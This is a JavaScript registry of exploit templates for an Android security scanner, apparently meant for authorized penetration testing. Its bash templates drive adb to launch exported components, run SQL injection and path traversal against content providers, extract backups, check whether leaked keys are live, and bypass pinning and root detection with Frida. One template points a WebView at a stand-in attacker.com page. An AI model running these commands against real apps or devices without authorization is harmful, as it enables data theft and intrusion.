/**
 * Shinodroid — PoC Exploit Templates Registry
 *
 * Each template is a verified, deterministic shell script or markdown guide
 * that demonstrates a specific vulnerability class.
 *
 * Templates use {{VARIABLE}} placeholders that are replaced with
 * finding-specific data at generation time.
 *
 * ADDING A NEW TEMPLATE:
 *   1. Add an entry to EXPLOIT_TEMPLATES below
 *   2. Add a matching pattern to EXPLOITABILITY_PATTERNS in poc.engine.mjs
 *   3. Done. The engine will auto-match findings to your new template.
 *
 * TEMPLATE SAFETY RULES:
 *   - NEVER delete files or data
 *   - NEVER exfiltrate data to external servers
 *   - ONLY demonstrate the vulnerability's existence
 *   - ALWAYS include a disclaimer header
 */

export const EXPLOIT_TEMPLATES = {

    // ═══════════════════════════════════════════════════════════════════════
    // TIER 1: Auto-Exploitable (Deterministic ADB Commands)
    // ═══════════════════════════════════════════════════════════════════════

    exported_activity: {
        title: "Exported Activity — Direct Launch",
        tier: 1,
        content: `#!/bin/bash
# PoC: Exported Activity — Direct Launch
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# This activity is exported without permission requirements,
# allowing any app (or ADB) to launch it directly,
# potentially bypassing authentication or accessing restricted screens.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Attempting to launch exported activity: {{ACTIVITY_NAME}}"
echo "[*] Package: {{PACKAGE_NAME}}"
echo ""

# Launch the exported activity
adb shell am start -n "{{PACKAGE_NAME}}/{{ACTIVITY_NAME}}"

echo ""
echo "[*] Check the device screen. If the activity opened without"
echo "    requiring authentication, this vulnerability is CONFIRMED."
echo ""
echo "[*] To test with extra data injection:"
echo "    adb shell am start -n '{{PACKAGE_NAME}}/{{ACTIVITY_NAME}}' --es username 'admin' --es token 'injected'"`,
    },

    content_provider: {
        title: "Exported Content Provider — Data Query",
        tier: 1,
        content: `#!/bin/bash
# PoC: Exported Content Provider — Data Query
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# This content provider is exported without proper permission checks,
# allowing any app to query its data, potentially exposing sensitive
# user information, credentials, or internal app state.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Querying exported content provider: {{PROVIDER_AUTHORITY}}"
echo "[*] Package: {{PACKAGE_NAME}}"
echo ""

# Query the content provider (list all rows)
adb shell content query --uri "content://{{PROVIDER_AUTHORITY}}"

echo ""
echo "[*] If data was returned above, this vulnerability is CONFIRMED."
echo "[*] The content provider is leaking data without authorization."
echo ""
echo "[*] Additional queries to try:"
echo "    adb shell content query --uri 'content://{{PROVIDER_AUTHORITY}}/users'"
echo "    adb shell content query --uri 'content://{{PROVIDER_AUTHORITY}}/accounts'"
echo "    adb shell content query --uri 'content://{{PROVIDER_AUTHORITY}}/credentials'"
echo ""
echo "[*] To attempt SQL injection:"
echo "    adb shell content query --uri 'content://{{PROVIDER_AUTHORITY}}' --where \"1=1) OR 1=1--\""`,
    },

    broadcast_receiver: {
        title: "Exported Broadcast Receiver — Intent Injection",
        tier: 1,
        content: `#!/bin/bash
# PoC: Exported Broadcast Receiver — Intent Injection
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# This broadcast receiver is exported and can be triggered by any app,
# potentially executing privileged operations without authorization.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Sending broadcast to exported receiver: {{RECEIVER_NAME}}"
echo "[*] Package: {{PACKAGE_NAME}}"
echo ""

# Send a broadcast intent to the exported receiver
adb shell am broadcast -a "{{PACKAGE_NAME}}.action.TRIGGER" \\
    -n "{{PACKAGE_NAME}}/{{RECEIVER_NAME}}" \\
    --es command "test" \\
    --es data "poc_injection"

echo ""
echo "[*] Check logcat for the receiver's response:"
echo "    adb logcat -d | grep -i '{{RECEIVER_NAME}}' | tail -20"
echo ""
echo "[*] If the receiver processed our intent, this vulnerability is CONFIRMED."`,
    },

    exported_service: {
        title: "Exported Service — Unauthorized Binding",
        tier: 1,
        content: `#!/bin/bash
# PoC: Exported Service — Unauthorized Binding
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# This service is exported without proper permission checks,
# allowing any app to start or bind to it.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Starting exported service: {{SERVICE_NAME}}"
echo "[*] Package: {{PACKAGE_NAME}}"
echo ""

# Start the service
adb shell am startservice -n "{{PACKAGE_NAME}}/{{SERVICE_NAME}}"

echo ""
echo "[*] Check if the service is running:"
adb shell dumpsys activity services "{{PACKAGE_NAME}}" 2>/dev/null | head -20

echo ""
echo "[*] If the service started, this vulnerability is CONFIRMED."`,
    },

    deep_link: {
        title: "Deep Link Hijacking — URI Scheme Abuse",
        tier: 1,
        content: `#!/bin/bash
# PoC: Deep Link Hijacking — URI Scheme Abuse
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app registers a deep link handler that can be triggered externally.
# This may allow bypassing authentication, accessing admin panels,
# or injecting data into the app.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Testing deep link: {{DEEP_LINK_URI}}"
echo "[*] Package: {{PACKAGE_NAME}}"
echo ""

# Trigger the deep link
adb shell am start -a android.intent.action.VIEW \\
    -d "{{DEEP_LINK_URI}}"

echo ""
echo "[*] Check the device screen for the deep link target."
echo "[*] If it opened a restricted screen, this vulnerability is CONFIRMED."
echo ""
echo "[*] Additional deep link tests:"
echo "    adb shell am start -a android.intent.action.VIEW -d '{{DEEP_LINK_URI}}/admin'"
echo "    adb shell am start -a android.intent.action.VIEW -d '{{DEEP_LINK_URI}}/reset?token=injected'"
echo "    adb shell am start -a android.intent.action.VIEW -d '{{DEEP_LINK_URI}}/../../../etc/passwd'"`,
    },

    debug_mode: {
        title: "Debug Mode Enabled — JDWP Attach",
        tier: 1,
        content: `#!/bin/bash
# PoC: Debug Mode Enabled (android:debuggable="true")
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app is built with debug mode enabled. This allows:
#   - Attaching a Java debugger (JDWP) to inspect/modify runtime state
#   - Accessing the app's private data directory via run-as
#   - Setting breakpoints on authentication/payment logic
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Testing debug mode for: {{PACKAGE_NAME}}"
echo ""

# Check if the app is debuggable
echo "[1/3] Checking debuggable flag..."
DEBUGGABLE=$(adb shell run-as {{PACKAGE_NAME}} id 2>&1)
if echo "$DEBUGGABLE" | grep -q "uid="; then
    echo "  [CONFIRMED] App is debuggable! We can access private data."
else
    echo "  [INFO] run-as check inconclusive: $DEBUGGABLE"
fi

echo ""

# List private files (only works if debuggable)
echo "[2/3] Listing private files..."
adb shell run-as {{PACKAGE_NAME}} ls -la /data/data/{{PACKAGE_NAME}}/shared_prefs/ 2>/dev/null || echo "  Could not access private files."

echo ""

# Check for JDWP processes
echo "[3/3] Checking for JDWP (Java Debug Wire Protocol)..."
adb jdwp 2>/dev/null | head -5
echo ""
echo "[*] If the app's PID appears in the JDWP list, an attacker can"
echo "    attach a debugger and step through authentication logic."`,
    },

    backup_enabled: {
        title: "Backup Enabled — Data Extraction via ADB",
        tier: 1,
        content: `#!/bin/bash
# PoC: Backup Enabled (android:allowBackup="true")
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app allows ADB backup, meaning any person with USB access
# can extract the app's private data (databases, shared prefs, files).
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Testing ADB backup for: {{PACKAGE_NAME}}"
echo ""

# Create a backup of the app's data
echo "[1/2] Initiating ADB backup (approve on device if prompted)..."
adb backup -apk -shared {{PACKAGE_NAME}} -f backup_{{PACKAGE_NAME}}.ab

echo ""
echo "[2/2] To extract the backup:"
echo "    dd if=backup_{{PACKAGE_NAME}}.ab bs=24 skip=1 | openssl zlib -d | tar xf -"
echo ""
echo "[*] If the backup was created, this vulnerability is CONFIRMED."
echo "    An attacker with physical access can extract all app data."`,
    },

    task_hijacking: {
        title: "Task Hijacking — Activity Spoofing",
        tier: 1,
        content: `#!/bin/bash
# PoC: Task Hijacking (StrandHogg-style)
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app's taskAffinity setting allows a malicious app to inject
# itself into the target app's task stack, spoofing the UI.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Checking task affinity for: {{PACKAGE_NAME}}"
echo ""

# Dump activity info to check taskAffinity
adb shell dumpsys package {{PACKAGE_NAME}} | grep -A 5 "taskAffinity"

echo ""
echo "[*] If taskAffinity is set to a non-default value (or empty),"
echo "    a malicious app can create an activity with the same affinity"
echo "    and appear on top of the legitimate app, stealing credentials."`,
    },

    tapjacking: {
        title: "Tapjacking — Screen Overlay Attack",
        tier: 1,
        content: `#!/bin/bash
# PoC: Tapjacking / Screen Overlay
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app does not use filterTouchesWhenObscured, allowing a
# transparent overlay to trick users into tapping hidden buttons.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Checking overlay protection for: {{PACKAGE_NAME}}"
echo ""

# Check if the app filters touches when obscured
adb shell dumpsys package {{PACKAGE_NAME}} | grep -i "filterTouchesWhenObscured" || \\
    echo "[INFO] filterTouchesWhenObscured not found in manifest — app may be vulnerable to tapjacking."

echo ""
echo "[*] To test manually:"
echo "    1. Install a screen overlay app (e.g., Toast Overlay PoC)"
echo "    2. Open the target app and trigger a sensitive action"
echo "    3. If the overlay appears over the button, vulnerability is CONFIRMED."`,
    },

    clipboard_exposure: {
        title: "Clipboard Data Exposure",
        tier: 1,
        content: `#!/bin/bash
# PoC: Clipboard Data Exposure
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app copies sensitive data to the clipboard, where any app can read it.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Monitoring clipboard for sensitive data from: {{PACKAGE_NAME}}"
echo ""

# Launch the app
adb shell am start -n "{{PACKAGE_NAME}}/{{ACTIVITY_NAME}}" 2>/dev/null

echo "[*] Perform a copy action in the app (copy password, token, etc.)"
echo "[*] Then run:"
echo ""
echo "    adb shell service call clipboard 2 s16 com.android.shell"
echo ""
echo "[*] If sensitive data appears, this vulnerability is CONFIRMED."`,
    },

    webview_js: {
        title: "WebView JavaScript Interface Injection",
        tier: 1,
        content: `#!/bin/bash
# PoC: WebView JavaScript Interface Injection
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app uses addJavascriptInterface in WebView, which on Android < 4.2
# allows arbitrary code execution. On newer versions, it still exposes
# Java methods to any JavaScript running in the WebView.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Testing WebView JS interface for: {{PACKAGE_NAME}}"
echo ""

# Check the app's API level
API=$(adb shell getprop ro.build.version.sdk)
echo "[*] Device API level: $API"

if [ "$API" -lt 17 ]; then
    echo "[CRITICAL] API < 17. addJavascriptInterface allows FULL RCE."
    echo "  Inject: <script>exposed.getClass().forName('java.lang.Runtime')..."
else
    echo "[HIGH] API >= 17. Only @JavascriptInterface methods are exposed."
    echo "  Review the app's source code for sensitive exposed methods."
fi

echo ""
echo "[*] To exploit, load a malicious page in the WebView:"
echo "    adb shell am start -a android.intent.action.VIEW -d 'http://attacker.com/xss.html' -n '{{PACKAGE_NAME}}/{{ACTIVITY_NAME}}'"`,
    },

    // ═══════════════════════════════════════════════════════════════════════
    // TIER 2: Semi-Automated (Template + Context)
    // ═══════════════════════════════════════════════════════════════════════

    hardcoded_secret: {
        title: "Hardcoded Secret/API Key — Validation",
        tier: 2,
        content: `#!/bin/bash
# PoC: Hardcoded Secret — Validation
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# A hardcoded secret was found in the application's source code.
# This script attempts to validate if the key is still active.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Testing hardcoded secret from: {{PACKAGE_NAME}}"
echo "[*] Key fragment: {{SECRET_VALUE}}"
echo ""

# For Google API keys (AIza...)
if echo "{{SECRET_VALUE}}" | grep -q "^AIza"; then
    echo "[*] Detected Google API Key. Testing Maps API..."
    curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=test&key={{SECRET_VALUE}}" | head -5
    echo ""
    echo "[*] If the response shows results (not an error), the key is ACTIVE and exploitable."

# For AWS keys (AKIA...)
elif echo "{{SECRET_VALUE}}" | grep -q "^AKIA"; then
    echo "[*] Detected AWS Access Key."
    echo "    To test: aws sts get-caller-identity --access-key-id {{SECRET_VALUE}}"
    echo "    WARNING: Only do this if you have authorization."

else
    echo "[*] Generic secret detected. Manual validation required."
    echo "    Search the decompiled source for how this key is used."
    echo "    Test against the corresponding API endpoint."
fi`,
    },

    cleartext_traffic: {
        title: "Cleartext HTTP Traffic — MITM Interception",
        tier: 2,
        content: `#!/bin/bash
# PoC: Cleartext HTTP Traffic — MITM Interception
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app transmits data over unencrypted HTTP, allowing
# network-level attackers to intercept and modify traffic.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Testing cleartext traffic for: {{PACKAGE_NAME}}"
echo "[*] Target URL: {{TARGET_URL}}"
echo ""

# Check network security config
echo "[1/2] Checking network security config..."
adb shell run-as {{PACKAGE_NAME}} cat /data/data/{{PACKAGE_NAME}}/res/xml/network_security_config.xml 2>/dev/null || \\
    echo "  No network_security_config.xml found (app may allow all cleartext)."

echo ""

# Monitor cleartext traffic
echo "[2/2] To intercept traffic:"
echo "    1. Set up mitmproxy: mitmproxy --mode transparent"
echo "    2. Route device traffic: adb shell settings put global http_proxy <your-ip>:8080"
echo "    3. Open the app and perform actions"
echo "    4. Check mitmproxy for unencrypted HTTP requests"
echo ""
echo "    To reset proxy: adb shell settings put global http_proxy :0"`,
    },

    weak_crypto: {
        title: "Weak Cryptographic Algorithm",
        tier: 2,
        content: `#!/bin/bash
# PoC: Weak Cryptographic Algorithm
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app uses a weak/deprecated cryptographic algorithm.
# This script demonstrates the weakness.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Demonstrating weak crypto in: {{PACKAGE_NAME}}"
echo ""

echo "[*] Example: Cracking MD5 hash"
echo "    echo -n 'password123' | md5sum"
echo -n 'password123' | md5sum
echo ""
echo "    An attacker can use rainbow tables or hashcat to crack MD5 in seconds."
echo ""
echo "[*] Example: ECB mode produces identical ciphertext for identical plaintext blocks"
echo "    echo -n 'AAAAAAAAAAAAAAAA' | openssl enc -aes-128-ecb -K '0123456789abcdef' -nosalt 2>/dev/null | xxd | head -4"
echo ""
echo "[*] Recommendation: Use AES-256-GCM with random IVs for all encryption."`,
    },

    sql_injection_cp: {
        title: "SQL Injection via Content Provider",
        tier: 2,
        content: `#!/bin/bash
# PoC: SQL Injection via Content Provider
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The content provider does not properly sanitize SQL queries,
# allowing injection attacks to extract or modify data.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Testing SQL injection on content provider: {{PROVIDER_AUTHORITY}}"
echo ""

# Basic query
echo "[1/4] Normal query..."
adb shell content query --uri "content://{{PROVIDER_AUTHORITY}}"

echo ""

# SQL injection: Always true condition
echo "[2/4] Injection: OR 1=1 ..."
adb shell content query --uri "content://{{PROVIDER_AUTHORITY}}" --where "1=1) OR (1=1"

echo ""

# SQL injection: UNION-based extraction
echo "[3/4] Injection: UNION SELECT ..."
adb shell content query --uri "content://{{PROVIDER_AUTHORITY}}" --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"

echo ""

# Path traversal in content URI
echo "[4/4] Path traversal..."
adb shell content query --uri "content://{{PROVIDER_AUTHORITY}}/../../../data/data/{{PACKAGE_NAME}}/databases/"

echo ""
echo "[*] If any injection returned data, this vulnerability is CONFIRMED."`,
    },

    cert_pinning_bypass: {
        title: "Certificate Pinning Bypass — Frida Script",
        tier: 2,
        content: `#!/bin/bash
# PoC: Certificate Pinning Bypass
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app implements SSL certificate pinning, but it can be bypassed
# using Frida to hook the certificate validation functions.
#
# Prerequisites: Frida server running on device, mitmproxy running on host.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Certificate pinning bypass for: {{PACKAGE_NAME}}"
echo ""
echo "[*] Prerequisites:"
echo "    1. Frida server running on device: adb shell /data/local/tmp/frida-server &"
echo "    2. mitmproxy running: mitmproxy --mode transparent"
echo ""

# Check if Frida is available
if command -v frida &> /dev/null; then
    echo "[*] Frida is installed. To bypass pinning:"
    echo ""
    echo "    frida --codeshare akabe1/frida-multiple-unpinning -f {{PACKAGE_NAME}}"
    echo ""
    echo "    Or use objection:"
    echo "    objection -g {{PACKAGE_NAME}} explore --startup-command 'android sslpinning disable'"
else
    echo "[WARN] Frida is not installed. Install with: pip install frida-tools"
fi`,
    },

    world_readable_storage: {
        title: "World-Readable Storage — Data Theft",
        tier: 2,
        content: `#!/bin/bash
# PoC: World-Readable Shared Preferences
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app stores data with world-readable permissions,
# allowing any app on the device to read its private files.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Checking file permissions for: {{PACKAGE_NAME}}"
echo ""

# List shared_prefs with permissions
echo "[1/2] Shared Preferences permissions:"
adb shell ls -la /data/data/{{PACKAGE_NAME}}/shared_prefs/ 2>/dev/null || \\
    adb shell run-as {{PACKAGE_NAME}} ls -la shared_prefs/ 2>/dev/null || \\
    echo "  Could not access (may need root or debug mode)."

echo ""

# Check databases
echo "[2/2] Database permissions:"
adb shell ls -la /data/data/{{PACKAGE_NAME}}/databases/ 2>/dev/null || \\
    adb shell run-as {{PACKAGE_NAME}} ls -la databases/ 2>/dev/null || \\
    echo "  Could not access (may need root or debug mode)."

echo ""
echo "[*] Files with rw-rw-rw- or similar world-readable permissions are VULNERABLE."`,
    },

    sensitive_logging: {
        title: "Sensitive Data in Logs — Logcat Extraction",
        tier: 2,
        content: `#!/bin/bash
# PoC: Sensitive Data in Logcat
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app logs sensitive data that can be read by other apps
# (on Android < 4.1) or via ADB.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Monitoring logcat for sensitive data from: {{PACKAGE_NAME}}"
echo ""

# Clear logcat and launch app
adb logcat -c
echo "[*] Launching app..."
adb shell monkey -p {{PACKAGE_NAME}} -c android.intent.category.LAUNCHER 1 2>/dev/null

# Wait for app to start and perform actions
sleep 5

# Capture logs
echo "[*] Capturing logs (10 seconds)..."
timeout 10 adb logcat --pid=$(adb shell pidof {{PACKAGE_NAME}}) 2>/dev/null | \\
    grep -iE "(password|token|secret|key|auth|credential|session|api)" | head -20

echo ""
echo "[*] If sensitive data appears above, this vulnerability is CONFIRMED."`,
    },

    root_detection_bypass: {
        title: "Root Detection Bypass — Frida Script",
        tier: 2,
        content: `#!/bin/bash
# PoC: Root Detection Bypass
# Finding: {{FINDING_TITLE}}
# Severity: {{FINDING_SEVERITY}}
# Target: {{PACKAGE_NAME}}
#
# The app checks for root/emulator but this can be bypassed with Frida.
#
# DISCLAIMER: For authorized security testing ONLY.

echo "[*] Root detection bypass for: {{PACKAGE_NAME}}"
echo ""

if command -v frida &> /dev/null; then
    echo "[*] Use Frida to bypass root detection:"
    echo ""
    echo "    frida --codeshare dzonerzy/fridantiroot -f {{PACKAGE_NAME}}"
    echo ""
    echo "    Or with objection:"
    echo "    objection -g {{PACKAGE_NAME}} explore --startup-command 'android root disable'"
else
    echo "[*] Manual bypass methods:"
    echo "    1. Use Magisk Hide / Zygisk DenyList"
    echo "    2. Rename su binary temporarily"
    echo "    3. Hook RootBeer/SafetyNet checks with Frida"
fi`,
    },

    // ═══════════════════════════════════════════════════════════════════════
    // TIER 3: Manual Guidance Only
    // ═══════════════════════════════════════════════════════════════════════

    manual_race_condition: {
        title: "Race Condition — Manual Testing Guide",
        tier: 3,
        content: `**Vulnerability:** Race Condition / TOCTOU
**Finding:** {{FINDING_TITLE}}
**Severity:** {{FINDING_SEVERITY}}

#### Why This Requires Manual Testing

Race conditions depend on precise timing and cannot be reliably automated with a simple script. The vulnerability exists when two operations (check and use) happen in sequence without atomic locking.

#### Step-by-Step Testing Methodology

1. **Identify the race window:**
   - Decompile the APK with \`jadx\`
   - Look for check-then-act patterns: \`if (isAuthorized()) { performAction(); }\`
   - Note the time between the check and the action

2. **Set up parallel requests:**
   \`\`\`bash
   # Use GNU parallel to send concurrent requests
   seq 1 50 | parallel -j 50 curl -s http://target/api/transfer -d "amount=1000"
   \`\`\`

3. **Monitor for inconsistencies:**
   - Check if the action was performed multiple times
   - Look for double-spending, duplicate entries, or authorization bypasses

4. **Tools:** Burp Suite Turbo Intruder, Race-the-Web, custom Frida hooks`,
    },

    manual_business_logic: {
        title: "Business Logic Flaw — Manual Testing Guide",
        tier: 3,
        content: `**Vulnerability:** Business Logic Flaw
**Finding:** {{FINDING_TITLE}}
**Severity:** {{FINDING_SEVERITY}}

#### Why This Requires Manual Testing

Business logic flaws are specific to the application's workflow and cannot be detected by automated scanners. They require understanding the app's intended behavior to identify deviations.

#### Step-by-Step Testing Methodology

1. **Map the business flow:**
   - Document each step of the critical workflow (payment, registration, etc.)
   - Identify where server-side validation should occur

2. **Test boundary conditions:**
   - Negative quantities/amounts
   - Skipping steps in multi-step flows
   - Replaying old tokens or requests
   - Changing order of operations

3. **Test authorization boundaries:**
   - Can User A access User B's data by changing IDs?
   - Can a free user access premium features by modifying requests?
   - Are server-side checks enforced, or only client-side?

4. **Tools:** Burp Suite, Frida (to modify runtime values), jadx (to understand validation logic)`,
    },

    manual_weak_random: {
        title: "Insecure Random Number Generator — Manual Testing Guide",
        tier: 3,
        content: `**Vulnerability:** Insecure Random Number Generator
**Finding:** {{FINDING_TITLE}}
**Severity:** {{FINDING_SEVERITY}}

#### Why This Requires Manual Testing

The app uses \`java.util.Random\` or \`Math.random()\` instead of \`SecureRandom\` for security-sensitive operations. These PRNGs are predictable if the seed is known.

#### Step-by-Step Testing Methodology

1. **Identify usage context:**
   - Decompile with \`jadx\` and search for \`new Random()\` or \`Math.random()\`
   - Determine if it's used for: tokens, OTPs, session IDs, or crypto keys

2. **Predict the output:**
   \`\`\`java
   // If the seed is time-based, collect multiple outputs:
   // Output 1: 0.7231742029971469 at timestamp 1234567890
   // Output 2: 0.1234567890123456 at timestamp 1234567891
   // Use a Java program with the same seed to predict future values.
   \`\`\`

3. **Exploit:**
   - Generate valid tokens/OTPs by predicting the PRNG output
   - Replay predicted values against the authentication endpoint

4. **Fix:** Replace all \`java.util.Random\` with \`java.security.SecureRandom\``,
    },
};
